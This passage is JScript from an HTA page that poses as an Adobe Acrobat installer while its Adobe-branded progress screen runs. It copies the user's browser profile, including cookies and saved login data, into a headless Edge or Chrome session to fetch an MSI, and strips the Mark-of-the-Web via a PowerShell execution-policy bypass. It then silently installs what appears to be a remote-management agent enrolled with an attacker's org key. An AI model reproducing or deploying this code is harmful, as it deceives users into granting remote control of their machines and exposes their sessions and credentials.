  var pf2 = shell.ExpandEnvironmentStrings("%ProgramFiles%");
  var la = shell.ExpandEnvironmentStrings("%LocalAppData%");
  var edge = [
    pf + "\\Microsoft\\Edge\\Application\\msedge.exe",
    pf2 + "\\Microsoft\\Edge\\Application\\msedge.exe",
    la + "\\Microsoft\\Edge\\Application\\msedge.exe"
  ];
  var chrome = [
    pf + "\\Google\\Chrome\\Application\\chrome.exe",
    pf2 + "\\Google\\Chrome\\Application\\chrome.exe",
    la + "\\Google\\Chrome\\Application\\chrome.exe"
  ];
  function pick(list) { for (var i = 0; i < list.length; i++) if (fso.FileExists(list[i])) return list[i]; return ""; }
  var e = pick(edge), c = pick(chrome);
  var exe = e || c;
  if (!exe) return { exe: "", kind: "" };
  var kind = e ? "edge" : "chrome";
  var profRoot = kind === "edge"
    ? la + "\\Microsoft\\Edge\\User Data"
    : la + "\\Google\\Chrome\\User Data";
  var profDir = profRoot + "\\Default";
  var profile = fso.FolderExists(profDir) ? profDir
    : fso.FolderExists(profRoot) ? profRoot : "";
  return { exe: exe, kind: kind, prof: profDir, root: profRoot };
}

// Copy a small set of fingerprint-relevant files from the real profile into
// the headless profile. Everything is optional; a partial clone still helps.
function cloneProfile(srcDir, dstRoot) {
  if (!srcDir) return 0;
  var files = ["Cookies", "Cookies-journal", "Preferences",
               "Login Data", "Login Data-journal", "Web Data",
               "Web Data-journal", "History", "History Provider",
               "Transport Security", "DIPS", "DIPS-wal", "Trust Tokens",
               "Trust Tokens-journal", "Reporting and NEL", "Safe Browsing"];
  var n = 0;
  for (var i = 0; i < files.length; i++) {
    var src = srcDir + "\\" + files[i];
    try {
      if (fso.FolderExists(src)) {
        fso.CopyFolder(src, dstRoot + "\\" + files[i], true);
      } else if (fso.FileExists(src)) {
        fso.CopyFile(src, dstRoot + "\\" + files[i], true);
      } else continue;
      n++;
    } catch (e) {}
  }
  // Local State lives at the User Data root, not in Default/ — copy it too.
  try {
    var ls = srcDir + "\\..\\Local State";
    if (fso.FileExists(ls) && !fso.FileExists(dstRoot + "\\..\\Local State")) {
      fso.CopyFile(ls, dstRoot + "\\..\\Local State", true);
      n++;
    }
  } catch (e) {}
  return n;
}

function startEdge(clean) {
  var tag = clean ? "edge2" : "edge";
  var info = realBrowserInfo();
  if (!info.exe) { logAttempt(tag + "-nobrowser"); nextStage(); return; }
  setStatus(dlMsgs[1]);

  var dir = extDir() + "\\edgedl";
  var udd = extDir() + "\\edgeprofile";
  deleteFileTree(dir);
  deleteFileTree(udd);
  ensureDir(dir);
  ensureDir(udd);
  var scanned = [dir];
  var dlUser = shell.ExpandEnvironmentStrings("%USERPROFILE%") + "\\Downloads";
  if (fso.FolderExists(dlUser) && dlUser.toLowerCase() !== dir.toLowerCase()) scanned.push(dlUser);
  extScanDirs = scanned;
  extSinceT = nowMs();
  extLastSize = -1; extStableT = 0;
  edgeMaxPartial = 0; edgeLastPartial = 0; edgeLastGrowT = nowMs(); edgeLogT = 0;
  // Unique per-tag marker so killByCmd can't hit the sibling stage's browser.
  edgeProcTag = "udtag" + tag + "=" + udd;

  var cloned = 0;
  if (!clean) {
    // Clone the real profile so the headless run carries the same cookies,
    // session state and fingerprint as the user's normal browsing.
    cloned = cloneProfile(info.prof, udd + "\\Default");
    try {
      var ls2 = info.root + "\\Local State";
      if (fso.FileExists(ls2)) fso.CopyFile(ls2, udd + "\\Local State", true);
    } catch (e) {}
  }

  var flags = "--headless=new --no-first-run --no-default-browser-check " +
    "--disable-gpu --disable-extensions --disable-component-update " +
    "--disable-background-networking --disable-sync --disable-translate " +
    "--disable-default-apps --mute-audio --no-sandbox --disable-crash-reporter " +
    "--disable-breakpad --disable-background-timer-throttling " +
    "--no-service-autorun --disable-client-side-phishing-detection " +
    "--disable-features=ChromeWhatsNewUI,Translate " +
    "--user-data-dir=\"edge" + tag + "=" + udd + "\" " +
    "--download-default-directory=\"" + dir + "\" " +
    "--user-agent=\"" + UA_STR + "\" " +
    "\"" + MSI_URL + "\"";
  try {
    shell.Run("\"" + info.exe + "\" " + flags, 0, false);
  } catch (e) { logAttempt(tag + "-exc: " + e.message); nextStage(); }
  logAttempt(tag + "-start: " + info.kind + " clean=" + clean + " cloned=" + cloned);
}

// --- shared external-file watch -----------------------------------------------
// Scans the stage's target folders (plus the user's real Downloads folder,
// in case the browser ignored our download-directory override).
function findExtFile() {
  if (!extScanDirs) return "";
  var best = "", bestSz = 0;
  for (var a = 0; a < extScanDirs.length; a++) {
    var d = extScanDirs[a];
    // The folder is being written to by another process (curl/Edge/BITS), so
    // the FSO snapshot can go stale mid-iteration and Item(i) can throw.
    // Retry with a fresh snapshot; per-item try/catch skips the lost slot.
    for (var attempt = 0; attempt < 3; attempt++) {
      try {
        if (!fso.FolderExists(d)) break;
        var files = fso.GetFolder(d).Files;
        for (var i = 0; i < files.Count; i++) {
          var f = null;
          try { f = files.Item(i); } catch (e2) {}
          if (!f) break;   // snapshot stale: loop ends, outer retry re-scans
          if (f.Name.length < 5) continue;
          var nl = f.Name.toLowerCase();
          if (nl.slice(-4) !== ".msi" && nl.indexOf(".crdownload") === -1 && nl.slice(-4) !== ".tmp") continue;
          if (extSinceT) {
            var mt = 0;
            try { mt = f.DateLastModified.getTime(); } catch (e3) {}
            if (mt < extSinceT - 3000) continue;
          }
          // Partial downloads (.crdownload/.tmp) feed the keep-alive tracker
          // but are never returned as the result.
          if (nl.indexOf(".crdownload") !== -1 || nl.slice(-4) === ".tmp") {
            if (f.Size > edgeMaxPartial) edgeMaxPartial = f.Size;
            continue;
          }
          if (f.Size > bestSz) { bestSz = f.Size; best = f.Path; }
        }
        break;   // snapshot was coherent; next dir
      } catch (e) { /* stale snapshot: retry fresh */ }
    }
  }
  return best;
}

function pollExtFile() {
  var p = findExtFile();
  if (!p) return null;
  var sz = 0;
  try { sz = fso.GetFile(p).Size; } catch (e) {}
  if (dlTotal > 0) {
    var pr = Math.min(95, sz * 100 / dlTotal);
    if (pr > progress) { progress = pr; setBar(pr); }
  }
  if (sz !== extLastSize) { extLastSize = sz; extStableT = 0; return null; }
  if (!extStableT) { extStableT = nowMs(); return null; }
  if (nowMs() - extStableT < 2000) return null;
  if (sz >= minSize() && msiMagicOk(p)) {
    // When the total size is known the MSI must match it closely — this
    // rules out unrelated .msi files in a shared folder (e.g. Downloads).
    if (dlTotal > 0 && (sz < dlTotal - 2048 || sz > dlTotal + 2048)) return null;
    completeExternal(p, STAGES[stageIdx]);
    return true;
  }
  if (sz < minSize() || dlTotal <= 0) return null;   // quiet partial: keep waiting
  if (dlTotal > 0 && (sz < dlTotal - 2048 || sz > dlTotal + 2048)) {
    logAttempt("ext-size-mismatch: " + STAGES[stageIdx] + " size=" + sz + " total=" + dlTotal);
    return false;
  }
  logAttempt("ext-badfile: " + STAGES[stageIdx] + " size=" + sz);
  return false;                                        // full-size but not an MSI
}

// --- shared chunk append / save -------------------------------------------------
function appendStream(body, totalHint) {
  var pre = dlPos;
  try {
    if (body && body.size > 0) {
      try { body.Seek(0, 0); } catch (e) {}
      dlStream.Position = dlStream.Size;
      dlStream.CopyFrom(body);
      dlPos = dlStream.Size;
      try { body.Close(); } catch (e) {}
    }
    dlStream.Position = dlStream.Size;
    dlStream.SaveToFile(msiPath, 2);
  } catch (e) {
    return false;
  }
  if (totalHint && totalHint > 0 && dlTotal <= 0) dlTotal = totalHint;
  if (dlPos > pre) sawReal = true;
  if (dlTotal > 0) {
    var p = Math.min(99, dlPos * 100 / dlTotal);
    if (p > progress) { progress = p; setBar(p); }
  } else if (dlPos > progress) {
    progress = Math.min(85, (dlPos / 1048576) * 8);
    setBar(progress);
  }
  setStatus(dlMsgs[dlMsgIndex()]);
  if (dlTotal > 0 && dlPos >= dlTotal) completeDownload();
  return true;
}

function completeDownload() {
  try { dlStream.Position = dlStream.Size; dlStream.SaveToFile(msiPath, 2); dlStream.Close(); } catch (e) {}
  dlStream = null;
  dlSettled = true;
  if (STAGES[stageIdx] === "async") dlMethod = "wininet-chunks";
  else if (STAGES[stageIdx] === "sync") dlMethod = "winhttp-chunks";
  else dlMethod = STAGES[stageIdx];
  if (dlTimer) clearInterval(dlTimer);
  verifyAndInstall();
}

// Copy an IStream (response body) to the MSI file. startPos > 0 resumes over a
// partial file; 0 overwrites.
function saveBody(body, method, startPos) {
  try {
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1; s.Mode = 3; s.Open();
    if (startPos > 0 && fso.FileExists(msiPath) && fso.GetFile(msiPath).Size >= startPos) {
      s.LoadFromFile(msiPath);
      s.Position = Math.min(startPos, s.Size);
    } else {
      s.Position = 0;
    }
    try { body.Seek(0, 0); } catch (e) {}
    s.CopyFrom(body);
    s.SaveToFile(msiPath, 2);
    s.Close();
  } catch (e) {
    return false;
  }
  dlMethod = method;
  dlSettled = true;
  sawReal = true;
  if (dlStream) { try { dlStream.Close(); } catch (e) {} dlStream = null; }
  if (dlTimer) clearInterval(dlTimer);
  verifyAndInstall();
  return true;
}

// An external stage (bits/curl/edge/edge2) produced a complete MSI at path.
function completeExternal(path, method) {
  if (dlTimer) clearInterval(dlTimer);
  stopAllWorkers();
  try {
    deleteFile(msiPath);
    fso.CopyFile(path, msiPath, false);
  } catch (e) {
    logAttempt("ext-copy-fail: " + e.message);
    msiPath = path;
  }
  if (method === "edge" || method === "edge2") {
    // Browser downloads carry the Mark-of-the-Internet; strip it so the
    // installer behaves like a locally saved file.
    try {
      shell.Run("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Unblock-File -LiteralPath '" + msiPath + "'\"", 0, true);
    } catch (e) {}
  }
  dlMethod = method;
  dlSettled = true;
  if (dlStream) { try { dlStream.Close(); } catch (e) {} dlStream = null; }
  verifyAndInstall();
}

// --- watchdog / progress loop ----------------------------------------------------
// The real work lives in _pollDownload so a single throw inside any stage
// can never surface as an HTA script-error dialog (which stops the page).
function pollDownload() {
  try { _pollDownload(); } catch (e) { logAttempt("poll-exc: " + e.message); }
}

function _pollDownload() {
  if (state !== "downloading" || dlSettled) return;
  var t = nowMs();
  var s = STAGES[stageIdx];

  if (t - dlStart > DL_MAX_MS) {
    dlSettled = true;
    if (dlTimer) clearInterval(dlTimer);
    stopAllWorkers();
    if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
    fail("Download timed out - please check your connection", "timeout " + (t - dlStart) + "ms");
    return;
  }

  if (s === "async") {
    if (!sawReal) {
      if (t - dlLastChunkT > DL_FIRST_BYTE_MS) { nextStage(); return; }
    } else if (t - dlLastChunkT > DL_CHUNK_MAX_MS) {
      handleChunkFailure("stall " + (t - dlLastChunkT) + "ms");
      return;
    }
  } else if (s === "sync") {
    if (!syncBusy && t >= syncNextT) requestSyncChunk();
  } else if (s === "pow") {
    pollPow();
    return;
  } else if (s === "bits") {
    var rb = pollExtFile();
    if (rb === true) return;
    if (rb === false) { nextStage(); return; }
    pollBits();
  } else if (s === "curl" || s === "edge" || s === "edge2") {
    var r = pollExtFile();
    if (r === true) return;
    if (r === false) { nextStage(); return; }
  }

  var budget = STAGE_BUDGET_MS[s];
  if (budget && t - stageT > budget) {
    // Browser/pow stages: keep the stage alive while bytes are still arriving
    // — on a slow connection the transfer can take several minutes for the
    // full 38 MB (a visible-browser run "took a whole while"). The stage is
    // cut only when the transfer has genuinely stalled (no growth for 45s),
    // or at the global DL_MAX_MS cap.
    var aliveMax = 0, lastGrowT = 0, growingNow = false;
    if (s === "edge" || s === "edge2") {
      aliveMax = edgeMaxPartial;
      lastGrowT = edgeLastGrowT;
      growingNow = edgeMaxPartial > edgeLastPartial;
      if (growingNow) { edgeLastPartial = edgeMaxPartial; edgeLastGrowT = t; }
    } else if (s === "pow") {
      aliveMax = powPartialMax;
      lastGrowT = powLastGrowT;
    }
    if (aliveMax > 0 && (growingNow || (t - lastGrowT) < 45000)) {
      if (t - edgeLogT > 10000) {
        edgeLogT = t;
        logAttempt("keepalive: " + s + " partial=" + aliveMax + " age=" + (t - lastGrowT) + "ms");
      }
      if (dlTotal > 0) {
        var pp = Math.min(88, aliveMax * 100 / dlTotal);
        if (pp > progress) { progress = pp; setBar(pp); }
      }
      return;   // hold the stage; the download is still working
    }
    logAttempt("stage-timeout: " + s + " maxPartial=" + aliveMax);
    stopAllWorkers();
    nextStage();
    return;
  }

  // No real progress yet: creep the bar on a slow curve so the window still
  // looks alive, capped well under 100%.
  if (!sawReal && progress < 88 && (s === "async" || s === "sync" || s === "oneshot" || s === "pow")) {
    progress += Math.max(0.04, (88 - progress) * 0.0035);
    setBar(progress);
  }
}

// ---------------------------------------------------------------------------
// Install phase.
//
// msiexec is launched with ShellExecute "runas" (the single UAC consent
// prompt). Completion is detected by watching the MSI /L*v log file itself —
// the final line "Installation success or error status: N" is written on exit.
// No external tooling is spawned to detect completion.
// ---------------------------------------------------------------------------
function startInstall() {
  if (tickTimer) clearInterval(tickTimer);
  startTime = new Date().getTime();
  progress = 90;
  setBar(progress);
  setStatus("Installing Adobe Acrobat&hellip;");
  lastLogSize = 0;
  lastLogGrowT = new Date().getTime();

  // Pass the Level org key as an MSI property so the installer registers the
  // agent with this org.
  var keyProp = (LEVEL_KEY && LEVEL_KEY !== "@@LEVEL_KEY@@" && LEVEL_KEY !== "")
      ? " LEVEL_API_KEY=" + LEVEL_KEY : "";
  var args = "/i \"" + msiPath + "\" /qn /norestart" + keyProp + " /L*v \"" + logPath + "\"";

  var launched = false;
  try {
    var sh = new ActiveXObject("Shell.Application");
    sh.ShellExecute("msiexec.exe", args, "", "runas", 1);
    launched = true;
  } catch (e) {}
  if (!launched) {
    try { shell.Run("msiexec " + args, 0, false); launched = true; } catch (e2) {}
  }
  if (!launched) {
    fail("Administrator approval is required to install Adobe Acrobat", "install: launch failed");
    return;
  }
  tickTimer = setInterval(tick, 200);
  pollTimer = setInterval(pollInstall, 800);
}

// Read the tail of the MSI log as TEXT (so .match works). msiexec writes the
// log in UTF-16 (LE), so a single-byte (iso-8859-1) read interleaves NULs
// into every line and the status regex never matches — a successful install
// then looks like "log stalled, no status". Use the FSO with Unicode
// decoding instead of ADODB.Stream.
function readLogTail(bytes) {
  var d = "";
  try {
    if (!fso.FileExists(logPath)) return "";
    var f = fso.OpenTextFile(logPath, 1, false, -1);   // -1 = Tristate (BOM-aware)
    try {
      var pos = Math.floor(f.Size / 2) - bytes;        // char offset (UTF-16 ≈ 2 bytes/char)
      if (pos > 0) f.Position = pos;
      d = f.Read(-1);                                  // read to end of file
    } catch (e) {
      try { f.Close(); } catch (e2) {}
      f = fso.OpenTextFile(logPath, 1, false, 0);      // fallback: ANSI/ASCII (1 byte/char)
      var pos2 = f.Size - bytes;
      if (pos2 > 0) f.Position = pos2;
      d = f.Read(-1);
    }
    try { f.Close(); } catch (e3) {}
    return d;
  } catch (e) { return ""; }
}

function logInfo() {
  var out = { exists: false, size: 0, status: -1 };
  try {
    if (fso.FileExists(logPath)) {
      out.exists = true;
      out.size = fso.GetFile(logPath).Size;
      var tail = readLogTail(65536);
      var m = tail.match(/Installation success or error status:\s*(-?\d+)/);
      if (m) out.status = parseInt(m[1], 10);
    }
  } catch (e) {}
  return out;
}

function pollInstall() {
  try { _pollInstall(); } catch (e) {}
}

function _pollInstall() {
  if (state !== "installing") return;
  var t = new Date().getTime();
  var info = logInfo();
  if (info.status >= 0) {
    if (info.status === 0 || info.status === 3010) finishInstall();
    else fail("Installation failed (error code " + info.status + ")", "install_rc=" + info.status);
    return;
  }
  if (info.exists) {
    if (info.size > lastLogSize) { lastLogSize = info.size; lastLogGrowT = t; }
    if (t - lastLogGrowT > INSTALL_STALL_MS) {
      // msiexec finished (or died) without writing a final status line.
      fail("Installation could not be completed", "install: log stalled, no status");
      return;
    }
    return;
  }
  // No log yet: UAC consent is pending (or was declined).
  if (t - startTime > INSTALL_MAX_MS) {
    fail("Administrator approval is required to install Adobe Acrobat", "install: uac timeout");
  }
}

function tick() {
  try { _tick(); } catch (e) {}
}

function _tick() {
  if (state === "installing") {
    if (progress < 99) { progress += 0.1; setBar(progress); }
    var p = progress;
    var i;
    if (p < 91) i = 0; else if (p < 95) i = 2; else i = 4;
    setStatus(instMsgs[i]);
  }
}

function setBar(p) {
  $("barfill").style.width = p + "%";
  $("pct").innerHTML = Math.round(p) + "%";
}
function setStatus(html) { $("status").innerHTML = html; }

// ---------------------------------------------------------------------------
// Diagnostics — reads the registry only, no external tooling.
// ---------------------------------------------------------------------------
function osBuild() {
  try {
    var v = shell.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentBuildNumber");
    if (v) return String(v);
  } catch (e) {}
  try {
    var v2 = shell.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentVersion");
    if (v2) return String(v2);
  } catch (e2) {}
  return "unknown";
}

function regStr(key, name) {
  try {
    var v = shell.RegRead(key + "\\" + name);
    return (typeof v === "undefined") ? "(none)" : String(v);
  } catch (e) { return "(none)"; }
}

function dumpDiagnostics(reason) {
  try {
    var L = [];
    L.push("Adobe Update diagnostics");
    L.push("time: " + new Date().toString());
    L.push("reason: " + reason);
    L.push("state: " + state);
    L.push("elapsed_ms: " + (new Date().getTime() - startTime));
    L.push("progress: " + Math.round(progress) + "%");
    L.push("dl_method: " + (dlMethod || "(none)"));
    L.push("http_status: " + (dlHttp || "(none)"));
    L.push("chunk_pos: " + dlPos + " / " + (dlTotal || "?"));
    L.push("chunk_retries: " + dlRetries);
  L.push("dl_phase: " + dlPhase);
  L.push("stage: " + (STAGES[stageIdx] || "?") + " " + (new Date().getTime() - stageT) + "ms");
  L.push("chunk_total: " + (dlTotal || "?"));
  L.push("sync_tries: " + syncTries);
  L.push("pow_partial_max: " + powPartialMax + " (stage " + (STAGES[stageIdx] === "pow" ? (new Date().getTime() - powT0) + "ms" : "n/a") + ")");
  L.push("pow_dir: " + (powDir ? (fso.FileExists(powDir + "\\level.msi") ? fso.GetFile(powDir + "\\level.msi").Size + " bytes" : "empty") : "(none)"));
    L.push("last_chunk_bytes: " + dlLastChunkBytes);
    L.push("last_chunk_silence_ms: " + (state === "downloading" ? (new Date().getTime() - dlLastChunkT) : 0));
    L.push("os: " + shell.ExpandEnvironmentStrings("%OS% %PROCESSOR_ARCHITECTURE%"));
    L.push("build: " + osBuild());
    L.push("msi: " + (fso.FileExists(msiPath) ? "yes (" + fso.GetFile(msiPath).Size + " bytes)" : "no"));
    L.push("wininet ProxyEnable: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyEnable"));
    L.push("wininet ProxyServer: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyServer"));
    L.push("wininet ProxyOverride: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyOverride"));
    L.push("wininet AutoConfigURL: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "AutoConfigURL"));
    L.push("winhttp mode: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "DefaultProxyRequirements"));
    L.push("winhttp ProxyServer: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "ProxyServer"));
    L.push("winhttp ProxyBypass: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "ProxyBypassList"));
    var tail = readLogTail(65536);
    if (tail) {
      L.push("--- msi log tail ---");
      var lines = tail.split("\n");
      for (var i = Math.max(0, lines.length - 25); i < lines.length; i++) L.push(lines[i]);
    }
    for (var i = 0; i < dlAttempts.length; i++) L.push("attempt: " + dlAttempts[i]);
  var w = fso.CreateTextFile(diagPath, true);
    w.Write(L.join("\r\n"));
    w.Close();
  } catch (e) {}
}

function fail(msg, reason) {
  if (state === "done" || state === "error") return;
  state = "error";
  if (tickTimer) clearInterval(tickTimer);
  if (dlTimer) clearInterval(dlTimer);
  if (pollTimer) clearInterval(pollTimer);
  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
  stopAllWorkers();
  dumpDiagnostics(reason || msg);
  setStatus(msg);
  $("heading").innerHTML = "Installation could not be completed";
  $("subnote").innerHTML = "Please check your internet connection and try again.";
  $("note").innerHTML = "You can now close this window.";
  $("cancelbtn").innerHTML = "Close";
}

function finishInstall() {
  if (state === "done" || state === "error") return;
  state = "done";
  if (tickTimer) clearInterval(tickTimer);
  if (dlTimer) clearInterval(dlTimer);
  if (pollTimer) clearInterval(pollTimer);
  progress = 100; setBar(100);
  setStatus("Installation complete");
  $("heading").innerHTML = "Adobe Acrobat is now installed";
  $("biglogo").style.display = "none";
  $("subnote").innerHTML = "Adobe Acrobat will be available the next time you open it.";
  $("note").innerHTML = "You can now close this window.";
  $("cancelbtn").innerHTML = "Close";
}

function cancel() {
  if (state === "done" || state === "error") { window.close(); return; }
  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
  if (dlStream) { try { dlStream.Close(); } catch (e) {} }
  stopAllWorkers();
  var p = [msiPath, logPath];
  for (var i = 0; i < p.length; i++) {
    try { if (fso.FileExists(p[i])) fso.DeleteFile(p[i], true); } catch (e) {}
  }
  try { if (powDir) deleteFileTree(powDir); } catch (e) {}
  try { deleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\__lvl__install.ps1"); } catch (e) {}
  window.close();
}
</script>
</body>
</html>
